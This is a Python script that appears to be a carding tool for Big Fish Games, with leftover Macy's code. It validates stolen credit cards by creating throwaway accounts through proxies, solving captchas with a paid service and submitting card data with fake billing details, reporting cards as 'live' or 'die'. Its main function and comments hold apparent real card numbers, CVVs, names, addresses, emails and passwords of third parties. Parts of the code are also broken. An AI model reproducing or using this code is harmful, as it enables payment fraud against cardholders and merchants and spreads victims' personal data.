#!/usr/bin/python
# -*- coding: utf-8 -*-   
# -*- coding: latin-1 -*-
import re, random;
import sys, time,os;
from PIL import Image, ImageMath
import json, urllib, base64, mybrowser,captcha2upload
from urllib.parse import urlparse, parse_qsl

class FinalForm:
    """ Final form of registration
    """
    form = "form";
    html = "source code";
    captchaControlName = None;
    questionControlName = None;
    captchaImage = None;
    captchaResult = None;
    keyantigate = None;
    questionString = None;
    questionResult = None;
    listLink = None;

    def __init__(self, form, html):
        self.form = form;
        self.html = html;


class Bigfishgames:
    """ Test reg forum
    """


    def __init__(self, emit='', qtcode='', header='', orderfinalForm=[], updatestatus='update',captcha_queue=None):
        self.updatestatus = updatestatus
        self.orderfinalForm = orderfinalForm;

        # ua.set_debug_responses(False)
        self.captcha_queue = captcha_queue;
        self.emit = emit;
        self.qtcode = qtcode;
        self.browser = mybrowser.Rqbrowser()
        self.browser.link_host = 'store.bigfishgames.com'
        self.browser.link_origin = 'https://store.bigfishgames.com'
        self.decaptcha_key = 'aa15c055da98e4867e9c924dce54f1e2'


    def add_header(self, link_refer, XMLHttpRequest=None, extraHeader={}):
        self.browser.add_header(link_refer, XMLHttpRequest=XMLHttpRequest, extraHeader=extraHeader)

    def fixHTML(self, html):
        return html.replace("'", '"');


    def fake_socks(self, sock):
        self.browser.set_proxies(sock5=sock)
    def site_login(self,email,password,sock='',order=False,sock_type=''):
        self.email = email
        self.password = password
        if sock and sock_type == 'proxy':
            self.browser.set_proxies(proxy=sock)
        elif sock:
            print(sock)
            self.browser.set_proxies(sock5=sock)
        # print('Trying Login to Your account'
        self.update_status('Trying Creat to Your account:' + email + '|' + password)

        self.browser.link_host = 'susi.bigfishgames.com'
        r = self.browser.open('https://susi.bigfishgames.com/login', timeout=30)

        all_forms = self.browser.selectForm(r.text)
        # print(all_forms)
        changeform =None
        for form in all_forms:
            if str(form).find('reg_email') != -1:
                changeform = form
                break
        if not changeform:
            print('check die: cant find reg_email form')
            return 'check die:socks die:'
        alphabet = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'
        min = 8
        max = 12
        stringimg = ''
        for x in random.sample(alphabet, random.randint(min, max)):
            stringimg += x
        data = self.browser.getInputForm(changeform)
        action_url = self.browser.getActionUrl(changeform)
        data['reg_email'] = self.email
        data['reg_pass'] = stringimg
        data['reg_pass_confirm'] = stringimg

        stringusername=''
        for x in random.sample(alphabet, random.randint(min, max)):
            stringusername += x
        data['reg_username'] = stringusername
        print('==',action_url,data)
        # request = changeform.click('reg_submit')
        # data = request.data
        # data = dict(parse_qsl(data))
        self.add_header('https://susi.bigfishgames.com/login',XMLHttpRequest=True)
        i = 0
        while i < 4:
            try:
                self.browser.link_host = 'susi.bigfishgames.com'
                r = self.browser.open('https://susi.bigfishgames.com/ajax/signup',data, timeout=30)
                if order:
                    html = r.read()
                    linkget = r.geturl()
                else:
                    html = r.text
                    linkget = r.url
                html = self.fixHTML(html);
            except Exception as e:
                print(e)
                time.sleep(1)
            else:
                break

            i += 1
        if i >= 4:
            print('socks die')
            return 'check die:socks die:'

        c = open('dien.html','w')
        c.write(html)
        if html.find('redirect":"') == -1:
            print('socks die')
            return 'check die:socks die:'
        # r = self.browser.open('https://susi.bigfishgames.com/confirm', timeout=5)

        print('Logged to your account')
        return email.strip() + '|' + password.strip()


    def send_message(self, message, to_user=None):
        """Send message to user
        @param message
        @param to_user user nick name, default is self.nicknamerequest
        @return
        """
        if not to_user:
            to_user = 'ruandejun';
        try:
            f = open('temp_data_chat2.txt', 'a')
            f.write('\n' + to_user + '|:|[+]' + message);
            f.plush()
            f.close()
        except:
            pass
        return

    def update_status(self, status):
        print(status)
        if self.updatestatus.find('ircbot') == -1:
            try:
                self.emit(self.qtcode.SIGNAL(self.updatestatus + '(QString,QString)'), "updatestatus", str(status))
            except:
                pass
        else:
            to_user = self.updatestatus.split('|')[1].strip()
            print(to_user)
            self.send_message(status, to_user=to_user)

    def random_string(self):
        alphabet = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'
        min = 8
        max = 12
        stringimg = ''
        for x in random.sample(alphabet, random.randint(min, max)):
            stringimg += x
        return stringimg
    #################################
    def get_shipping_infomation(self, list_address_drop):
        self.email_gift = None
        if list_address_drop.find('@') != -1 and list_address_drop.find('|') == -1 and color.strip().isdigit():
            self.email_gift = list_address_drop.strip()
        elif list_address_drop.find('|') != -1:
            hangdrop = list_address_drop.split('|')
            self.sfirstname = hangdrop[0].strip()
            self.slastname = hangdrop[1].strip()
            self.saddress1 = hangdrop[2].strip()
            self.saddress2 = hangdrop[3].strip()
            self.scity = hangdrop[4].strip()
            self.sstate = hangdrop[5].strip().upper()
            self.szipcode = hangdrop[6].strip()
            if self.szipcode.find('-') != -1:
                self.szipcode = self.szipcode.split('-')[0].strip()
        sphoneopen = open('us_phone.db')
        listsphone = sphoneopen.read()
        list_phone = listsphone.split('\n')
        min = 0
        max = len(list_phone) - 1
        ran_phone = random.randint(min, max)
        dau = 1000000
        cuoi = 9999999
        phone_them = random.randint(dau, cuoi)
        self.sphone = list_phone[ran_phone].strip().split('|')[0].strip() + str(phone_them)

        if len(self.sphone) != 10:
            self.update_status('Your PhoneNumber Is Not 10 Number:')
            return 'order die:Your PhoneNumber Is Not 10 Number:';
        self.sphone1 = self.sphone[:3]
        self.sphone2 = self.sphone[3:6]
        self.sphone3 = self.sphone[6:]
        alphabet = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'
        min = 8
        max = 16
        stringimg = ''
        list_domain = ['comcast.net', 'verizon.net', 'earthlink.net', 'att.net', 'sbcglobal.net', 'msn.com', 'juno.com',
                       'yahoo.com', 'aol.com', 'live.com']
        mail_domain = list_domain[random.randint(0, len(list_domain) - 1)]
        for x in random.sample(alphabet, random.randint(min, max)):
            stringimg += x
        username_chuan = stringimg
        # print(checkout_form
        self.email_chuan = username_chuan + '@' + mail_domain

    def get_card_infomation(self, list_card):
        hangcard = list_card.split('|')
        self.ccnum = hangcard[0].strip()
        self.ccmonth = hangcard[1].strip()
        self.ccyear = hangcard[2].strip()
        # self.ccv = hangcard[3].strip()

    def get_list_item_link(self, item_id_link, size='', color='', quantity='1'):
        self.list_item_link = []
        if item_id_link and item_id_link.find('.txt') == -1:
            self.list_item_link.append(item_id_link + '|' + size + '|' + color + '|' + quantity)
        elif item_id_link.find('.txt') != -1:
            listitemopen = open(item_id_link)
            itemopenread = listitemopen.read().replace('\r', '\n')
            listitemopen.close()
            for line_item in itemopenread.split('\n'):
                if line_item.find('|') != -1 and line_item.find('http') != -1:
                    items = line_item.split('|')
                    if len(items) >= 4:
                        self.list_item_link.append(line_item)
                elif line_item.find('http') != -1 and line_item.find('|') == -1:
                    self.list_item_link.append(line_item + '|||1')

    def go_to_mycard(self,order=True,amount=500):
        i = 0
        while i < 4:
            try:
                self.browser.link_host = 'profile.23zdo.club'
                r = self.browser.open('http://profile.23zdo.club/payment/api/captcha/Get?length=4&width=80&height=26&oldVerify=abc', timeout=5)
                if order:
                    html = r.read()
                    linkget = r.geturl()
                else:
                    html = r.content
                    linkget = r.url
                html = self.fixHTML(html);
            except Exception as e:
                print(e)
                time.sleep(1)
            else:
                break
            i += 1
        if i >= 4:
            print('socks die')
            return 'order die:socks die:'
        self.update_status('Trying Get Catpcha')
        new_html = eval(html)
        verify = new_html[0]
        image_data = base64.b64decode(new_html[1])
        captcha_save = self.save_image(image_data)

        if self.decaptcha_key:

            i = 0
            while i < 4:
                try:
                    captcha = captcha2upload.CaptchaUpload(self.decaptcha_key)
                    captcha_input = captcha.solve(captcha_save)
                except Exception as e:
                    print(e)
                    time.sleep(1)
                else:
                    break
                i += 1
            if i >= 4:
                print('socks die')
                return 'order die:socks die:'
            os.remove(captcha_save)
        else:
            try:
                self.emit(self.qtcode.SIGNAL(self.updatestatus + '(QString,QString)'), "type_captcha", str(captcha_save))
                captcha_input = self.captcha_queue.get()
            except:
                captcha_input = raw_input('input captcha')
                os.remove(captcha_save)
        self.update_status('Captcha Text is:'+str(captcha_input))
        i = 0
        while i < 4:
            try:
                self.browser.link_host = 'profile.23zdo.club'
                request_data = {"amount":amount,"captcha":captcha_input,"verify":verify,"domain":"23zdo.club","PaymentMethod":"Credit Card (Hong Kong Visa)"}
                r = self.browser.open('http://profile.23zdo.club/payment/api/payment/DoMyCardBilling',json_data=request_data)
                if order:
                    html = r.read()
                    linkget = r.geturl()
                else:
                    html = r.content
                    linkget = r.url
                html = self.fixHTML(html);
            except Exception as e:
                print(e)
                time.sleep(1)
                if str(e).find('HTTP Error 400') != -1:
                    return self.go_to_mycard()
            else:
                break
            i += 1
        if i >= 4:
            print('socks die')
            return 'order die:socks die:'
        return html

    def submit_order(self):
        self.update_status('Trying go to profile')
        html = self.go_to_mycard()
        if html.find('order die') != -1:return html

        self.update_status('Trying go to mycard520')
        if html.find('AuthCode=') != -1:
            link_request = html.replace('"',"")

            self.update_status(link_request)
            print(link_request)
            i = 0
            while i < 4:
                try:
                    self.browser.link_host = 'www.mycard520.com.tw'
                    r = self.browser.open(link_request, timeout=5)
                    html = r.read()
                    linkget = r.geturl()
                    html = self.fixHTML(html);

                except Exception as e:
                    print(e)
                    time.sleep(1)
                else:
                    break
                i += 1
            if i >= 4:
                print('socks die')
                return 'order die:socks die:'
        all_forms = self.browser.selectForm(html,linkget)
        changeform =None
        for form in all_forms:
            print(form)
            if str(form).find('TextControl(TextBox2') != -1:
                changeform = form
                break
        if not changeform:
            print('order die: cant find TextBox2 form')
            return 'order die: cant find TextBox2 form'
        alphabet = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'
        min = 8
        max = 16
        stringimg = ''
        list_domain = ['comcast.net', 'verizon.net', 'earthlink.net', 'att.net', 'sbcglobal.net', 'msn.com', 'juno.com',
                       'yahoo.com', 'aol.com', 'live.com']
        mail_domain = list_domain[random.randint(0, len(list_domain) - 1)]
        for x in random.sample(alphabet, random.randint(min, max)):
            stringimg += x
        username_chuan = stringimg
        # print(checkout_form
        self.email_chuan = username_chuan + '@' + mail_domain
        # changeform.set_all_readonly(False)
        __VIEWSTATE = changeform.find_control('__VIEWSTATE').value
        __VIEWSTATEGENERATOR = changeform.find_control('__VIEWSTATEGENERATOR').value
        __EVENTVALIDATION = changeform.find_control('__EVENTVALIDATION').value
        print(__VIEWSTATEGENERATOR, __EVENTVALIDATION)
        data = {}
        data['__VIEWSTATE'] = __VIEWSTATE
        data['__VIEWSTATEGENERATOR'] = __VIEWSTATEGENERATOR
        data['__EVENTVALIDATION'] = __EVENTVALIDATION
        data['TextBox2'] = self.email_chuan
        data['TextBoxForCoupon'] = ''
        data['freemcardId'] = ''
        data['hidactivity'] = '1'
        data['HiddenFieldPoint'] = '1'
        data['agree'] = 'on'
        self.update_status('Trying go to MyCardBilling')
        request_url = 'https://www.mycard520.com.tw/MyCardBilling/OverSeas/default.aspx'
        while i < 4:
            try:

                r = self.browser.open(request_url,urllib.urlencode(data),timeout=5)
                html = r.read()
                linkget = r.geturl()
                html = self.fixHTML(html);

            except Exception as e:
                print(e)
                time.sleep(1)
            else:
                break
            i += 1
        if i >= 4:
            print('socks die')
            return 'order die:socks die:'
        all_forms = self.browser.selectForm(html,linkget)
        changeform =None
        for form in all_forms:
            # print(form
            if str(form).find('HiddenControl(MerchantID') != -1:
                changeform = form
                break
        if not changeform:
            print('order die: cant find MerchantID form')
            return 'order die: cant find MerchantID form'
        request = changeform.click()
        self.update_status('Trying go to input CC')
        while i < 4:
            try:
                r = self.browser.open(request,timeout=5)
                html = r.read()
                linkget = r.geturl()
                html = self.fixHTML(html);
            except Exception as e:
                print(e)
                time.sleep(1)
            else:
                break
            i += 1
        if i >= 4:
            print('socks die')
            return 'order die:socks die:'
        all_forms = self.browser.selectForm(html,linkget)
        changeform =None
        for form in all_forms:
            print(form)
            if str(form).find('RadioControl(ccbrand') != -1:
                changeform = form
                break
        if not changeform:
            print('order die: cant find ccbrand form')
            return 'order die: cant find ccbrand form'

        changeform['ccnum1'] = self.ccnum[:4]
        changeform['ccnum2'] = self.ccnum[4:8]
        changeform['ccnum3'] = self.ccnum[8:12]
        changeform['ccnum4'] = self.ccnum[12:]
        changeform['ccexpmm'] =[self.ccmonth]
        changeform['ccexpyy'] =[self.ccyear]
        request = changeform.click('Submit')
        data_new = request.data
        card_type=''
        if int(self.ccnum[:1]) == 3:
            card_type = 'AMEX'
        elif int(self.ccnum[:1]) == 4:
            card_type = 'VISA'
        elif int(self.ccnum[:1]) == 5:
            card_type = 'MASTERCARD'
        elif int(self.ccnum[:1]) == 6:
            card_type = 'DINERS'
        data_new = data_new.replace('ccbrand=VISA','ccbrand='+card_type)
        url_post = request.get_full_url()
        self.update_status('Trying Place Order')
        while i < 4:
            try:
                r = self.browser.open(url_post,data_new,timeout=5)
                html = r.read()
                linkget = r.geturl()
                html = self.fixHTML(html);
            except Exception as e:
                print(e)
                time.sleep(1)
            else:
                break
            i += 1
        if i >= 4:
            print('socks die')
            return 'order die:socks die:'
        all_forms = self.browser.selectForm(html,linkget)
        changeform =None
        for form in all_forms:
            print(form)
            if str(form).find('HiddenControl(PaReq') != -1:
                changeform = form
                break
        if changeform:
            self.update_status('Trying go to VBV')
            request = changeform.click('Submit')
            while i < 4:
                try:
                    r = self.browser.open(request,timeout=5)
                    html = r.read()
                    linkget = r.geturl()
                    html = self.fixHTML(html);
                except Exception as e:
                    print(e)
                    time.sleep(1)
                else:
                    break
                i += 1
            if i >= 4:
                print('socks die')
                return 'order die:socks die:'
            all_forms = self.browser.selectForm(html,linkget)
            changeform =None
            for form in all_forms:
                print(form)
                if str(form).find('HiddenControl') != -1:
                    changeform = form
                    break
            self.update_status('Trying go to Submit VBV')
            if str(changeform).find('SubmitControl(submit') != -1:
                request = changeform.click('submit')
            else:
                request = changeform.click()
            while i < 4:
                try:
                    r = self.browser.open(request,timeout=5)
                    html = r.read()
                    linkget = r.geturl()
                    html = self.fixHTML(html);
                except Exception as e:
                    print(e)
                    time.sleep(1)
                else:
                    break
                i += 1
            if i >= 4:
                print('socks die')
                return 'order die:socks die:'
            c = open('dien.html', 'w')
            c.write(html)
            all_forms = self.browser.selectForm(html,linkget)
            self.update_status('Trying go to get results')
            changeform =None
            for form in all_forms:
                print(form)
                if str(form).find('<pa_res_form') != -1:
                    changeform = form
                    break
                elif str(form).find('HiddenControl(PaReq') != -1:
                    changeform = form
                    break
            request = changeform.click()
            while i < 4:
                try:
                    r = self.browser.open(request,timeout=5)
                    html = r.read()
                    linkget = r.geturl()
                    html = self.fixHTML(html);
                except Exception as e:
                    print(e)
                    time.sleep(1)
                else:
                    break
                i += 1
            if i >= 4:
                print('socks die')
                return 'order die:socks die:'
            c = open('dien1111.html', 'w')
            c.write(html)
            orderstatus = html.find('PaysDone.aspx')
            request_url_re = re.search('form1" action="(.+?)"',html)
            if orderstatus != -1:
                request_url = request_url_re.group(1).strip()
                ReturnMsgNo = re.search('ReturnMsgNo" value="(.+?)"',html).group(1).strip()
                ReturnMsg = re.search('ReturnMsg" value="(.+?)"',html).group(1).strip()
                TradeSeq = re.search('TradeSeq" value="(.+?)"',html).group(1).strip()
                AuthCode = re.search('AuthCode" value="(.+?)"',html).group(1).strip()
                data = {}
                data['ReturnMsgNo'] = ReturnMsgNo
                data['ReturnMsg'] = ''
                data['TradeSeq'] = TradeSeq
                data['AuthCode'] = AuthCode
                print(AuthCode,TradeSeq,ReturnMsg,ReturnMsgNo,request_url)
                while i < 4:
                    try:
                        r = self.browser.open(request_url,urllib.urlencode(data),timeout=5)
                        html = r.read()
                        linkget = r.geturl()
                        html = self.fixHTML(html);
                    except Exception as e:
                        print(e)
                        time.sleep(1)
                    else:
                        break
                    i += 1
                if i >= 4:
                    c = open('dien_error.html','w')
                    c.write(html)
                    print('socks die')
                    return 'order die:socks die:'
        else:
            orderstatus = html.find('PaysDone.aspx')

        order_submited = ''
        order_fasle = ''
        c = open('dien.html', 'w')
        c.write(html)
        # print(dien

        if orderstatus != -1:

            order_submited = self.email_chuan + '|' + self.email + '|' + self.password + '\n'
            self.update_status(order_submited)
            print(order_submited)
        else:
            order_fasle = 'Your order could not be completed'
            print(order_fasle)
            error_w = open('error.html', 'w')
            error_w.write(html)
            return 'order die:' + order_fasle
        if order_submited:
            return order_submited
        elif order_fasle:
            return 'order die:' + order_fasle;
        else:
            return;

    def check_cc(self,ccnumber,ccmonth,ccyear,cvv):


        # self.add_header('https://store.bigfishgames.com/cart.php')
        self.browser.link_host='store.bigfishgames.com'
        self.browser.link_origin=''
        self.add_header('https://store.bigfishgames.com/')
        i=0
        while i < 4:
            try:
                r = self.browser.open('https://store.bigfishgames.com/cart.php?credits=1&gameclub=1',timeout=5)

                html = r.text
                linkget = r.url
                self.add_header(linkget)
            except Exception as e:
                print(e)
                time.sleep(1)
            else:
                break
            i += 1
        if i >= 4:
            print('socks die')
            return 'check die:socks die:'

        request_url='https://store.bigfishgames.com/source/web/submit.json'
        changeform={}

        card_type=''
        if int(ccnumber[:1]) == 3:
            card_type = 'american_express'
        elif int(ccnumber[:1]) == 4:
            card_type = 'visa'
        elif int(ccnumber[:1]) == 5:
            card_type = 'mastercard'
        elif int(ccnumber[:1]) == 6:
            card_type = 'discover'
        if len(ccmonth) == 2:
            if int(ccmonth[:1]) == 0:
                ccmonth = ccmonth[1:]
        _token_re = re.search('input type="hidden" value="(.+?)" name="billingProfile\[_token\]',html)
        if not _token_re:
            print('check die can find token')
            return 'check die:socks die'
        print(_token_re.group(1).strip())

        changeform['billingProfile[address][firstName]'] = self.random_string()
        changeform['billingProfile[address][lastName]'] = self.random_string()
        changeform['billingProfile[address][country]'] = 'FR'
        changeform['billingProfile[address][address1]'] = str(random.randint(1, 9999)) +' '+ self.random_string()+' '+ self.random_string()
        changeform['billingProfile[address][address2]'] =''
        changeform['billingProfile[address][city]'] =self.random_string()
        changeform['billingProfile[address][state]'] =self.random_string()
        changeform['billingProfile[address][zip]'] =str(random.randint(1000, 999999))
        changeform['billingProfile[payment][paymentMethodName]'] = card_type
        changeform['billingProfile[payment][ccNumber]'] =ccnumber
        changeform['billingProfile[payment][expDate][month]'] =ccmonth
        changeform['billingProfile[payment][expDate][year]'] =ccyear
        changeform['billingProfile[payment][cvv]'] = cvv#str(random.randint(1000, 9999))
        changeform['billingProfile[saveProfile]'] ='1'
        changeform['billingProfile[_token]'] =_token_re.group(1).strip()
        print(changeform)
        # request = changeform.click()
        # data_new = request.data
        i=0
        while i < 4:
            try:
                self.add_header('https://store.bigfishgames.com/cart.php?credits=1&gameclub=1',XMLHttpRequest=True)
                r = self.browser.open(request_url,data=changeform,timeout=30)
                html = r.text
                linkget = r.url
                html = self.fixHTML(html);
                print(html)
                self.add_header(linkget)
            except Exception as e:
                print(e)
                time.sleep(1)
            else:
                break
            i += 1
        if i >= 4:
            print('socks die')
            return 'check die:socks die'
        print('==========')
        c = open('dien.html', 'w')
        c.write(html)
        if html.find('redirect":"\/source\/web\/receipt') != -1 or html.find('error_cart_total_quantity"') !=-1:
            print('card live')
            return ccnumber
        elif html.find('error_unable_to_process_transaction"') != -1:
            print('card die')
            return 'check die:card die'
        else:
            print('Error die')
            return 'check die:socks die'
        # print(dien

    def check(self, ccnumber='',ccmonth='',ccyear='',cvv='',sock='',sock_type='',email='', password='', username=''):
        #MobileSafari/9537.53 CFNetwork/672.0.8 Darwin/14.0.0/3647344
        #Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/528.16 (KHTML, like Gecko) Version/4.0 Safari/528.16/686133
        # header='Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Oupeng/10.2.1.86910 Safari/534.30'
        self.browser = mybrowser.Rqbrowser()
        alphabet = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'
        min = 8
        max = 16
        stringimg = ''
        list_domain = ['comcast.net', 'verizon.net', 'earthlink.net', 'att.net', 'sbcglobal.net', 'msn.com', 'juno.com',
                       'yahoo.com', 'aol.com', 'live.com']
        mail_domain = list_domain[random.randint(0, len(list_domain) - 1)]
        for x in random.sample(alphabet, random.randint(min, max)):
            stringimg += x
        username_chuan = stringimg
        # print(checkout_form
        self.email_chuan = username_chuan + '@' + mail_domain
        login = self.site_login(self.email_chuan, password,sock=sock,sock_type=sock_type)
        if login.find('check die') == -1:
            check_card = self.check_cc(ccnumber,ccmonth,ccyear,cvv)
            return check_card

        else:
            return login

    def check_order_status(self, order_number,email_order, sock='', sock_type='', username='', password=''):

        self.browser = mybrowser.Rqbrowser()
        self.browser.link_host = 'www.macys.com'
        self.browser.link_origin = 'https://www.macys.com'
        if sock:
            self.browser.set_proxies(sock5=sock)
        request_url = 'https://www.macys.com/service/order-details'
        request_data={}
        request_data['OrderNumber'] = order_number
        request_data['giftLookupFlag'] = 'false'
        request_data['zipCode'] = ''
        request_data['emailID'] = email_order
        self.add_header('https://www.macys.com/')
        i = 0
        while i < 4:
            try:
                r = self.browser.open('https://www.macys.com/service/order-status',timeout=5)
                allforms = self.browser.selectForm(r)
                checkform=None
                for form in allforms:
                    if str(form).find('TextControl(OrderNumber') !=-1:
                        checkform = form
                        break
                if not checkform:
                    return 'check die:socks die:'
                checkform['OrderNumber'] = order_number
                checkform['emailID'] = email_order
                request = checkform.click()
                r = self.browser.open(request,timeout=5)
                r = self.browser.open('https://www.macys.com/service/order-details',timeout=5)
                html = r.content
                c = open('dien.html','w')
                c.write(html)
                # print(html
                link_get = r.url
                html = self.fixHTML(html);
                self.add_header(link_get, XMLHttpRequest=True)
            except:
                time.sleep(1)
            else:
                break
            i += 1
        if i >= 4:
            print('socks die')
            return 'check die:socks die:'

        if html.find('<H1>Access Denied</H1>') != -1:
            return 'check die:socks die:'

        order_status = ''
        tracking = ''
        if html.find('div class="progressBarNormal canceled') != -1:
            print('canceled')
            order_status = order_status + 'canceled\n'
            tracking = 'Canceled'
        elif html.find('div class="progressBar') != -1:
            order_status = order_status + 'processing\n'
            print('processing')
            trackingre = re.search('<li class="trackID">tracking \#:\s*<span>(.+?)</span>', html)
            if trackingre:
                tracking = trackingre.group(1).strip()
            else:
                if html.find('button" id="cancelOrderButton') == -1:
                    tracking = 'Shipped'
                else:
                    tracking = 'processing'
            print(tracking)
        order_status = order_status + 'Shipping Address\n'
        order_status = order_status + 'All Item\n'
        order_status = order_status + tracking + '\n'
        return order_status

    def get_info_account_infomation(self,get_all_card=False):
        i = 0
        while i < 4:
            try:
                r = self.browser.open('https://secure-m.macys.com/api/v1/wallet/summary')
                if get_all_card:
                    html = r.content

                else:
                    html = r.read()
            except:
                time.sleep(1)
            else:
                break
            i += 1
        if i >= 4:
            print('socks die')
            return 'check die:socks die:'


        list_info = self.get_billing_and_macys_id(html,get_all_card=get_all_card)
        # print(list_info
        return list_info

    def get_info_account(self, account_infomation):
        try:
            accounts = account_infomation.split('|')
            self.email = accounts[0].strip()
            self.password = accounts[1].strip()
        except:
            return
        return True

    def save_image(self,image_data):
        alphabet = 'abcdefghijklmnopqrstuvwxyz1234567890ABCDEFGHIJKLMNOPQRSTUVWXYZ'
        min = 5
        max = 10
        stringimg = ''
        for x in random.sample(alphabet, random.randint(min, max)):
            stringimg += x
        captcha_load = 'captchaZDO' + stringimg + '.png'
        f = open(captcha_load, 'wb');
        f.write(image_data)
        f.close()
        def difference1(source, color):
            """When source is bigger than color"""
            return (source - color) / (255.0 - color)

        def difference2(source, color):
            """When color is bigger than source"""
            return (color - source) / color


        def color_to_alpha(image, color=None):
            image = image.convert('RGBA')
            width, height = image.size

            color = map(float, color)
            img_bands = [band.convert("F") for band in image.split()]

            # Find the maximum difference rate between source and color. I had to use two
            # difference functions because ImageMath.eval only evaluates the expression
            # once.
            alpha = ImageMath.eval(
                """float(
                    max(
                        max(
                            max(
                                difference1(red_band, cred_band),
                                difference1(green_band, cgreen_band)
                            ),
                            difference1(blue_band, cblue_band)
                        ),
                        max(
                            max(
                                difference2(red_band, cred_band),
                                difference2(green_band, cgreen_band)
                            ),
                            difference2(blue_band, cblue_band)
                        )
                    )
                )""",
                difference1=difference1,
                difference2=difference2,
                red_band = img_bands[0],
                green_band = img_bands[1],
                blue_band = img_bands[2],
                cred_band = color[0],
                cgreen_band = color[1],
                cblue_band = color[2]
            )

            # Calculate the new image colors after the removal of the selected color
            new_bands = [
                ImageMath.eval(
                    "convert((image - color) / alpha + color, 'L')",
                    image = img_bands[i],
                    color = color[i],
                    alpha = alpha
                )
                for i in xrange(3)
            ]

            # Add the new alpha band
            new_bands.append(ImageMath.eval(
                "convert(alpha_band * alpha, 'L')",
                alpha = alpha,
                alpha_band = img_bands[3]
            ))

            return Image.merge('RGBA', new_bands)

        image = Image.open(captcha_load)
        image = color_to_alpha(image, (0, 0, 0, 255))
        background = Image.new('RGB', image.size, (0, 0, 0))
        background.paste(image.convert('RGB'), mask=image)
        for x in random.sample(alphabet, random.randint(min, max)):
            stringimg += x
        captcha_save = 'captchaIMG' + stringimg + '.png'
        background.save(captcha_save)
        os.remove(captcha_load)
        return captcha_save

    def order(self, list_address_drop, listbilling, list_card='', item_name='', flavors='', quantity='1',
              item_id_link='', weight='', account_infomation='', sock='', shipping_info='', billasship=None,mixbillasship=None):
        """
            item_id = flavors
            color = item
        """

        self.sock = sock
        if self.sock:
            self.browser.set_proxies(sock5=self.sock)
        ##fisrt_name|last_name|address|address2|city|state|zipcode|phone
        if account_infomation:
            account = self.get_info_account(account_infomation)
            if not account:
                return 'order die:invalid account infomation'

        if list_card:
            # self.get_billing_infomation(listbilling)
            self.get_card_infomation(list_card)
        else:
            print('invalid card infomation')
            self.update_status('invalid billing infomation')
            return 'order die:invalid billing infomation';
        if item_id_link:
            self.get_list_item_link(item_id_link, size=weight, color=flavors, quantity=quantity)
        else:
            self.update_status('config link incorect')
            return 'order die:config link incorect';
            # print(listbilling
        # self.update_status('bill To:' + listbilling)
        #print(list_address_drop
        login_html = self.site_login(self.email, self.password,order=True)
        if login_html.find('check die') != -1:
            if login_html.find('socks die') != -1:
                return 'order die:socks die:'
            else:
                return 'order die:Your Usename Or Password incorect'
        #print('Logged to Account:'+self.email+'|'+self.password
        self.update_status('Logged to Account:' + self.email + '|' + self.password)

        if self.sock:
            self.browser.set_proxies(sock5=self.sock)

        submit_order = self.submit_order()
        #print(submit_order
        if submit_order.find('order die:') == -1:
            self.update_status('Trying Get Order Info')
            #print('Trying Get Order Info'
            #self.cookie.clear_session_cookies()
            #self.cookie.clear()
            return submit_order

        print(submit_order)
        return submit_order;




def main():


    listbilling = 'Yingge|Wang|39078 Guradino Dr. APT 308||Fremont|CA|94538|Visa6087|4388576044536087|2|2019'
    list_address_drop = 'Yingge|Wang|39078 Guradino Dr. APT 308||Fremont|CA|94538|Visa6087|4388576044536087|2|2019'
    #1288375392|FPTgeoEICiYnzs@sbcglobal.net|brynargust@yahoo.com|bryn0320
    #4147098647146372|12|2019|00|Brandon Braun|Address||||||bdogg3000@gmail.com
    #5376280708882256|12|2026
    ordervr = Bigfishgames()
    ordervr.check(ccnumber='4358806409808201',ccmonth='04',ccyear='2030',cvv='309',sock='',sock_type='proxy')
    # ordervr.get_info_account_infomation()
    # ordervr.change_email_info()='
    # check_status = ordervr.check_order_status('1250059297','stephanie_mun@gorge.net',sock='127.0.0.1:9951')
    # print(check_status
    # check = ordervr.check('LizaHickey@gmail.com','sahale',sock='127.0.0.1:9951',sock_type='socks')
    # print(check
    # card_id = ordervr.get_macys_card_info('208172905',get_all=True)
    # print(card_id
    # bskvarla@pacbell.net|Hanoi123
    #artglasscreations@sbcglobal.net|dakota|TravisL|buss|2374 Hardscrabble Rd||Drain|OR|97435|Macys4580|438283264580|1|1999
    # status = ordervr.order('','',list_card='4147099237311806|11|2020',
    #                        account_infomation='kittyvaidai|hanoi123',
    #                        sock='127.0.0.1:9951', flavors='', item_name='',
    #                        item_id_link='http://www1.macys.com/shop/product/chanel-coco-noir-eau-de-parfum-1.7-oz?ID=725964',
    #                        weight='')
    # print(status


if __name__ == "__main__":
    sys.exit(main())
